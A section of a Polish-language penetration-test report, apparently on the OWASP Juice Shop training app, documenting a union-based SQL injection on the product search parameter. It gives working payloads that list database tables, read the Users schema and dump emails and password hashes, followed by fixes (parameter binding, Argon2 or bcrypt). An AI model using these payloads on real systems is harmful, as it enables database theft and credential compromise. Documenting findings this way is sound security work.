
\subsection{\colorbox{red!80}{\parbox{\textwidth}{PT02-SQL-INJ: Wydobycie haseł użytkowników z użyciem klasycznego SQL Injection}}}
\subsubsection{Opis}
Atak miał na celu wykorzystanie SQL Injection do wydobycia haseł użytkowników z bazy danych sklepu. Celem ataku była końcówka \lstinline[]|/rest/products| z parametrem q, przez który jest przekazywana wyszukiwana fraza. Jak udało się ustalić, odpowiednie przygotowanie frazy pozwala na odczyt bazy danych SQL.

\subsubsection{Warunki niezbędne do wykorzystania podatności}
\textbf{Brak}. Wykonanie ataku nie wymaga logowania. Przydatna jest jednak wiedza na temat struktury/wersji bazy pochodząca z rekonesansu.
\subsubsection{Szczegóły wykonania}
Schemat ogólny wysyłanych żądań został zawarty w tabeli.
\begin{table}[H]
    \begin{tabular}{|l|l|l|l|l|l|}
    \hline
    \rowcolor[HTML]{EFEFEF} 
    \multicolumn{1}{|c|}{\cellcolor[HTML]{EFEFEF}\textbf{Metoda}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Końcówka}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Nagłowki}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Ciasteczka}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Dane}}                             & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Odpowiedź/wynik}} \\ \hline
    GET                                                          & \begin{lstlisting}
/rest/products/?q=apple')) 
union select 1,2,3,4,5,6,7,8,
group_concat(tbl_name) from 
sqlite_master where type='table' 
and tbl_name not like 'sqlite_%'--
    \end{lstlisting}                                        & -                                  & -                 & - & 200 \
    \begin{lstlisting}
{"status":"success","data":
[{"id":1,"name":2,
"description":3,"price":4,
"deluxePrice":5,"image":6,
"createdAt":7,"updatedAt":8,
"deletedAt":"Users,Addresses...
    \end{lstlisting}                                \\ \hline
    \end{tabular}
    \end{table}

Główną zmienną jest tutaj parametr Query String o nazwie q, który dla tej końcówki pozwala na dostęp do bazy danych.

Atak został podzielony na trzy etapy:
\begin{itemize}
    \item Zdobycie informacji o bazie
    \begin{itemize}
        \item Parametr/zapytanie
        
        \begin{lstlisting}
?q=apple')) union select 1,2,3,4,5,6,7,8,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%'--
        \end{lstlisting}

        \item Odpowiedź serwera
        
        \begin{lstlisting}
['Users', 'Addresses', 'Baskets', 'Products', 'BasketItems', 'Captchas', 'Cardsedbacks', 'ImageCaptchas', 'Memories', 'PrivacyRequests', 'Quantities', 'Recyclllets']
        \end{lstlisting}    
    \end{itemize}

    Odpowiedź zawiera listę tabel niesystemowych, dzięki czemu wiadomo jak nazywa się tabela zawierająca potencjalnie wartościowe dane. Ten atak wykorzystuje już wcześniej znaną informację o wersji bazy aplikacji. Bez takiej wiedzy należało by to zbadać stosując np. charakterystyczne funkcje różnych implementacji baz danych
    
    
    
    
    \item Zdobycie informacji o tabeli
    
    \begin{itemize}
        \item Parametr/zapytanie
        
        \begin{lstlisting}
?q=apple')) union select 1,2,3,4,5,6,7,8,group_concat(sql) from sqlite_master where type='table' and tbl_name like 'Users%'--
        \end{lstlisting}

        \item Odpowiedź serwera
        
        \begin{lstlisting}
CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHA `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` 55) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/imag5) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, IME)
        \end{lstlisting}    
    \end{itemize}
    
    Odpowiedź zwraca kod SQL tworzący tabelę, z którego łatwo wywnioskować jakie kolumny zawiera

    \item Pobranie danych użytkowników
    
    \begin{itemize}
        \item Parametr/zapytanie
        
        \begin{lstlisting}
?q=apple')) union select 1,2,3,4,5,6,group_concat(username),group_concat(email),group_concat(password) from users;--
        \end{lstlisting}

        \item Odpowiedź serwera
        
        \begin{lstlisting}
[('', 'admin@juice-sh.op', 
'240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9'),
('', 'jim@juice-sh.op',
'c534541702f7e186e3520e8e929c1b9c19b3afc7be14adc5491a64a7563e963c'),...
        \end{lstlisting}    
    \end{itemize}

    Proste wykonanie ataku z wykorzystaniem wydobytej wcześniej wiedzy pozwala na pobranie hashy haseł użytkowników w celu wykonania szybszych, ukrytych ataków lokalnych
    

\end{itemize}

\subsubsection{Skutki}
Wykorzystanie podatności pozwala na \textbf{pobranie hashy haseł wszystkich użytkowników sklepu}.

\subsubsection{Zalecenia}

Rozwiązaniem tego problemu jest upewnienie się, że przy każdym zapytaniu do bazy danych jego treść jest odpowiednio sanityzowana. Jednym z najlepszych podejść jest tutaj wykorzystanie mechanizmu parameter binding. Warto też skorzystać z biblioteki, w której zapytanie z sanityzacją jest tą domyślną opcją, którą trzeba ręcznie wyłączyć w razie potrzeby.

Przykład naprawy w pliku login.ts
\begin{lstlisting}
models.sequelize.query(`SELECT * FROM Users WHERE email = $mail AND password = $pass AND deletedAt IS NULL`, { 
    model: UserModel, 
    bind: {mail: req.body.email, pass: security.hash(req.body.password)},
    plain: true 
    })
.then((authenticatedUser) => [...]
\end{lstlisting}
Przedstawiony kod zawiera już poprawę - parametr bind. Przed nią zapytanie było składane jako zwykła suma ciągów tekstowych.

W tym miejscu warto również zarekomendować zmianę algorytmu hashowania na nowocześniejsze i bezpieczniejsze Argon2, czy Bcrypt. Dodatkowe użycie soli i ewentualnie pieprzu dodatkowo zminimalizowało by skutki udanego ataku jak ten przedstawiony w tej sekcji.

